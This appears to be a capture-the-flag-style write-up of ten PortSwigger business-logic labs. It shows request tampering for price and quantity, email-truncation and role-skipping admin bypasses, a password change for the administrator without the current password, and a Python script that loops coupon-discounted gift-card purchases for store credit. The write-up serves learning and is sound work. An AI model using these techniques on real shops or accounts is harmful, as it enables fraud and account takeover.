# Business Logic

### Lab 1: Excessive trust in client-side controls <a href="#lab-1-excessive-trust-in-client-side-controls" id="lab-1-excessive-trust-in-client-side-controls"></a>

To solve this lab, buy the leather jacket. When added to the cart, here are the parameters sent:

```
productId=1&redir=PRODUCT&quantity=1&price=133700
```

I can change the `price` to 1, and then send the request. This sets the price of the jacket to $0.01.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-8b3a88fe1d80f16bbfd1fd8bbc8473f208258bd7%252Fportswigger-business-writeup-image.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=2a498628&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### Lab 2: High-Level Logic Vuln <a href="#lab-2-high-level-logic-vuln" id="lab-2-high-level-logic-vuln"></a>

To solve the lab, buy the jacket. This time, the `price` parameter is not present. When removing items from the cart, it sends another POST request:

```http
productId=1&quantity=-1&redir=CART
```

I can keep sending the same request until I get a negative number of jackets:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-a5ff694f8740d80434cba1192994317bec8dfa95%252Fportswigger-business-writeup-image-1.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=c150a6e9&#x26;sv=2" alt=""><figcaption></figcaption></figure>

When trying to checkout, it does not let me as the total price cannot be negative. In this case, I can keep adding other products until the total price is a positive number.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-e8512f5fefe9cd3d0fa1c506a76488c443a4b5d5%252Fportswigger-business-writeup-image-2.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=19ec5d32&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This method works in checking out. To exploit it, I can just add 1 jacket and then add other products in the negatives until I can afford it.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-785e65935bd3ad6fa7287c60e1752112a1cbcafa%252Fportswigger-business-writeup-image-3.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=9b6afcd0&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### Lab 3: Inconsistent Security Controls <a href="#lab-3-inconsistent-security-controls" id="lab-3-inconsistent-security-controls"></a>

To solve this lab, delete the `carlos` user. I have access to an email client and I can register users using an email:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-6517fe7c71fdc4f75aaf50f0e2b1faac38b3a379%252Fportswigger-business-writeup-image-4.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=80ae4b09&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I registered a user with the email and confirmed the account:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-9fb2223d55d44ad4e8077296a9af46f36b65005e%252Fportswigger-business-writeup-image-5.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=abb1a1bd&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I noticed that there was a domain for workers. I changed my email account to `attacker@dontwannacry.com` on the 'My Account' page.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-7c10b534aad87a4da290caef26f604ab9cb28cc3%252Fportswigger-business-writeup-image-6.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=13350cb8&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I could then access the admin panel to delete `carlos`.

### Lab 4: Flawed Enforcement of Rules <a href="#lab-4-flawed-enforcement-of-rules" id="lab-4-flawed-enforcement-of-rules"></a>

To solve this lab, buy the jacket. I noticed that there was a checkout code:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-435875958b2049d410909ab410342ba545db7515%252Fportswigger-business-writeup-image-7.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=b93246e9&#x26;sv=2" alt=""><figcaption></figcaption></figure>

At the bottom of the page when logged in, there's a newsletter sign up:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-4218c0a5e38dfb020707d4e9084513552160d2b5%252Fportswigger-business-writeup-image-8.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=a2195f5f&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This gives me a new coupon code:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-cd7f5de9d347df8703d5c4985ad7af2d38ac7633%252Fportswigger-business-writeup-image-9.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=92c539&#x26;sv=2" alt=""><figcaption></figcaption></figure>

By using these two coupon codes, I can bypass the 'Coupon has already been used' error by interleaving their usage:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-3ef705056b2dec86acdff454ba280c89e58826be%252Fportswigger-business-writeup-image-10.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=e7c2cd73&#x26;sv=2" alt=""><figcaption></figcaption></figure>

It seems that the website only checks whether the **previously used coupon** is the same. Repeated usage will result in a free jacket!

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-23d6d56eb65f15b1d4df0863c3901da2c425e98f%252Fportswigger-business-writeup-image-11.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=87c11339&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### Lab 5: Low-Level Logic Flaw <a href="#lab-5-low-level-logic-flaw" id="lab-5-low-level-logic-flaw"></a>

This lab has an integer flow error. So by adding a ton of jackets to the cart, I can cause an overflow which will make the price negative.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-946f46139765c32ec88762c5bc323378d260d00d%252Fportswigger-business-writeup-image-12.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=f561e88d&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Eventually, after adding enough jackets, the price will almost be affordable.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-4ccfee3cfa56d7b194506e0b5a79949a1c5c2982%252Fportswigger-business-writeup-image-13.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=2c5fd9a1&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Just add enough items to the cart such that the total price is positive and less than 100.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-a9826bf4cf9f5f3729c4e8baa1f37e46bc695a4b%252Fportswigger-business-writeup-image-14.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=c0a35725&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Then checkout!

### Lab 6: Inconsistent Exceptional Input Handling <a href="#lab-6-inconsistent-exceptional-input-handling" id="lab-6-inconsistent-exceptional-input-handling"></a>

To solve this lab, delete `carlos` as the administrator of the website. I have access to an email client for this lab.

One thing I noted was the fact that the email client will receive emails with all subdomains.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-9e5e2a25a87ed98b50988b15e93f9e4f496e9b9f%252Fportswigger-business-writeup-image-15.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=7acb8a89&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I registered with a very long email:

```
attackerwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww@exploit-0aea00fa03545b628000c58c0125005c.exploit-server.net
```

I confirmed my email via the client, and logged in. The first thing I noticed was that my email was truncated!

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-0b5a0594aba21b2b6a90ed3e78ede156f93810fb%252Fportswigger-business-writeup-image-16.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=1ae1d5cd&#x26;sv=2" alt=""><figcaption></figcaption></figure>

The above has 255 characters. To access the admin panel, I need an email ending with `@dontwannacry.com`.

To do this, I have to somehow make the website truncate my email to `email@dontwannacry.com`, but I still have to receive the actual email to confirm my account.

Since the client receives all email with the same domain, I can create an email ending with `@dontwannacry.com.EXPLOITMAIL`, and just append junk to the front such that the 'm' from `.com` is at the 255th character.

I used this email to register:

```
1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111@dontwannacry.com.exploit-0aea00fa03545b628000c58c0125005c.exploit-server.net
```

When the account is confirmed and I logged in, I could see that it worked. The website truncated the email to end with `dontwannacry.com` and I had access to the administrator panel:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-84580c727bf010a09c70587884ad93777ce66b23%252Fportswigger-business-writeup-image-17.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=1a74c99a&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### Lab 7: Weak isolation on dual-use endpoint <a href="#lab-7-weak-isolation-on-dual-use-endpoint" id="lab-7-weak-isolation-on-dual-use-endpoint"></a>

To solve this lab, delete `carlos`. When logged in, I noticed there was a password change functionality that takes in a username and current password:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-9b6f6a8e327f24fb365dd0794fcce46ede70c885%252Fportswigger-business-writeup-image-18.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=64df3ac2&#x26;sv=2" alt=""><figcaption></figcaption></figure>

By changing the `username` to `administrator` and removing the 'current password' parameter, I can change the admin's password:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-a4d5f112977f98ea7fffd717a8642cd56a10bb23%252Fportswigger-business-writeup-image-19.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=f7631e30&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Then I can login and delete `carlos`.

### Lab 8: Insufficient Workflow Validation <a href="#lab-8-insufficient-workflow-validation" id="lab-8-insufficient-workflow-validation"></a>

To solve this lab, buy the jacket. When trying to buy it, I see this request being made due to me not having enough money:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-0a882476134d2cad3a25af5de11a2ead568d4be7%252Fportswigger-business-writeup-image-20.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=596ca8ca&#x26;sv=2" alt=""><figcaption></figcaption></figure>

When buying a product I can actually afford, this is the message returned:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-1929ee6f83c4a51d5806f010ee0dd08b4dd1122e%252Fportswigger-business-writeup-image-21.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=8b2dcef4&#x26;sv=2" alt=""><figcaption></figcaption></figure>

So when intercepting requests, I can attempt to checkout and change the `err` request to the `order-confirmed` request to solve the lab.

### Lab 9: Auth Bypass via Flawed State <a href="#lab-9-auth-bypass-via-flawed-state" id="lab-9-auth-bypass-via-flawed-state"></a>

To solve this lab, delete `carlos`. I intercepted each request for the login.

There was this option here to select a 'role':

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-9a7882591ee471ebd060a95eaf6337785bbc4625%252Fportswigger-business-writeup-image-22.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=308a787b&#x26;sv=2" alt=""><figcaption></figcaption></figure>

When intercepted, I changed the `role` parameter sent to `administrator`.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-554893ff648b38a304350c4ee5f2ff7f835260e5%252Fportswigger-business-writeup-image-23.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=411cd2e7&#x26;sv=2" alt=""><figcaption></figcaption></figure>

However, this did not work. I tried dropping the request to the `role-selector`, and the website defaulted to make me an administrator:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-fda3db481e68cb6fd97e211e084289aa1bc56b9c%252Fportswigger-business-writeup-image-24.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=21d12059&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Then, just delete `carlos`.

### Lab 10: Infinite Money <a href="#lab-10-infinite-money" id="lab-10-infinite-money"></a>

To solve this lab, buy the jacket. I am given an email client to use. When logged in, I saw that there was a gift card redeeming function:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-71289a5560f180655af779ce9f8cc4fe8ec03824%252Fportswigger-business-writeup-image-25.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=f9a63edf&#x26;sv=2" alt=""><figcaption></figcaption></figure>

There's also a newsletter sign up:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-3867a2c83704d024821b60eb9397258b462ad66d%252Fportswigger-business-writeup-image-26.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=32b001c8&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This gives me a coupon:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-bc35cba1a2232be2e5107eeed44c88422f8b1148%252Fportswigger-business-writeup-image-27.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=c6156e76&#x26;sv=2" alt=""><figcaption></figcaption></figure>

There was also this Gift card item:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-6dceb800936c01bc3a73cf36ba9987ba8b3d98a0%252Fportswigger-business-writeup-image-28.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=10dc99b&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I could apply the SIGNUP30 bonus on this:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-8f33e5bba4d194106304a2e0e9fbd1173b6ec97f%252Fportswigger-business-writeup-image-29.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=4ad3fa08&#x26;sv=2" alt=""><figcaption></figcaption></figure>

So I could buy a $10 giftcard for $7.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-cf744a5f8bd4b2e856d501494723dd29b3ae7a2c%252Fportswigger-business-writeup-image-30.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=fe26dd35&#x26;sv=2" alt=""><figcaption></figcaption></figure>

`fDGaXvnW0E` is the code. I could buy another one:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-76d0e8599df5efaddebafe88c3948f1d75f73876%252Fportswigger-business-writeup-image-31.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=9e15ba7e&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Within the email client, I can see that it gives me the token there as well:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-357a484539f3e5fca55e0416a663812c94133226%252Fportswigger-business-writeup-image-32.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=fe50e81d&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Anyways, this code is redeemable within the 'My Account' page, under the gift card section. So each time I do this, I gain $3. To exploit this server, I created a Python script to automate the entire process!

```python
import requests
import re
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = '0a8a00dd031722d08106a2300038002e'
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = f'https://{HOST}.web-security-academy.net'
cookies = {
	'session':'Y2AczSp5KZECDUeSaAjNzPpgxItus1Se'
}
s = requests.Session()

while True:
	## Add Product to Cart
	cart_data = {
		'productId':'2',
		'redir':'CART',
		'quantity':'1'
	}

	add_r = s.post(url + '/cart', data=cart_data,cookies=cookies,proxies=proxies,verify=False)

	## Grab CSRF token 
	r = s.get(url + '/cart',cookies=cookies,proxies=proxies,verify=False)
	match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
	cart_csrf_token = match[1]

	## Apply Coupon
	coupon_data = {
		'csrf':cart_csrf_token,
		'coupon':'SIGNUP30'
	}
	coupon_r = s.post(url + '/cart/coupon', data=coupon_data,cookies=cookies,proxies=proxies,verify=False)

	## Grab CSRF
	r = s.get(url + '/cart',cookies=cookies,proxies=proxies,verify=False)
	match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
	checkout_csrf_token = match[1]

	## Checkout 
	checkout_data = {
		'csrf':checkout_csrf_token,
	}
	checkout_r = s.post(url + '/cart/checkout',data=checkout_data,cookies=cookies,proxies=proxies,verify=False)
	pattern = re.compile(r'<td>([A-Za-z0-9]+)</td>')
	match = pattern.findall(checkout_r.text)
	if match:
        ## Apply Gift Card
		code = match[1]
		r = s.get(url + '/my-account',cookies=cookies,proxies=proxies,verify=False)
		match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
		gift_csrf = match[1]
		gift_data = {
			'csrf':gift_csrf,
			'gift-card':code
		}
		bal_r = s.post(url + '/gift-card', data=gift_data, cookies=cookies, proxies=proxies, verify=False)
		pattern = re.compile(r'<p><strong>Store credit: \$([\d.]+)</strong></p>')
		match = pattern.search(bal_r.text)
		print("Credit value: " + match.group(1))

	else:
		print('[-] Something went wrong!')
```

I was lazy to use threading, so I just waited. I also noticed that the threads tend to cause each other to fail when testing, so I think keeping to one is stabler.
